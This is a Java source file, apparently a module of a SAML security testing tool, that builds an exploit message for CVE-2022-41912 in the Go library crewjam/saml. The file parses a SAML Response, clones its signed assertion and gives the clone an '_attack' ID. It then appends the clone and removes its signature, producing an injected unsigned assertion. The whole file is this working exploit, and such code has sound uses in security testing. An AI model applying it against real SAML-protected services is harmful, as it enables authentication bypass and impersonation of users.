package helpers;

import helpers.XMLHelpers;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import java.io.IOException;

/// Links:
/// * CVE-2022-41912: https://nvd.nist.gov/vuln/detail/CVE-2022-41912
/// * Vulnerable Library: crewjam/saml (Go)
/// * Description: The library verifies the signature of the first assertion but may consume data from a subsequent assertion.
public class CVE_2022_41912 {

    public static final String CVE = "CVE-2022-41912";

    public static String apply(String samlMessage) throws SAXException, IOException {
        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        // the xml must contain a response
        Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
        if (response == null) {
            throw new IllegalArgumentException("No 'Response' element found.");
        }

        // get the first assertion (the true one)
        Element originalAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        if (originalAssertion == null) {
            throw new IllegalArgumentException("No 'Assertion' element found.");
        }

        // we can then copy it to create our fake assertion
        Element maliciousAssertion = (Element) originalAssertion.cloneNode(true);

        // I think it's better to change the ID of the fake assertion
        String originalID = maliciousAssertion.getAttribute("ID");
        if (originalID != null && !originalID.isEmpty()) {
            maliciousAssertion.setAttribute("ID", originalID + "_attack");
        } else {
            maliciousAssertion.setAttribute("ID", "attack_assertion_" + System.currentTimeMillis());
        }

        response.appendChild(maliciousAssertion);

        // finally we have to remove to signature so the parser will not see that its fake
        NodeList children = maliciousAssertion.getChildNodes();
        for (int i = 0; i < children.getLength(); i++) {
            Node child = children.item(i);
            if ("Signature".equals(child.getLocalName())) {
                maliciousAssertion.removeChild(child);
                break;
            }
        }

        return xmlHelpers.getString(document);
    }

    private CVE_2022_41912() {
        // static class
    }
}